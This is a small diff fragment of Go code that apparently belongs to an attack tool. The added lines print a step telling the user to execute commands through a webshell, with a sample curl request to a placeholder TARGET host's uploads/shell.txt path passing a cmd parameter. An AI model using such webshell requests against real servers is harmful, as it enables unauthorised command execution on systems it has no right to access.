+		fmt.Printf("  %sStep 4: Execute commands via webshell%s\n", clrYellow, clrReset)
+		fmt.Printf("  curl \"http://TARGET/uploads/shell.txt?cmd=id\"\n")
+		fmt.Println()
+		fmt.Println("  ═════════════════════════════════════════════════════════")
 		fmt.Println()
 	}
 
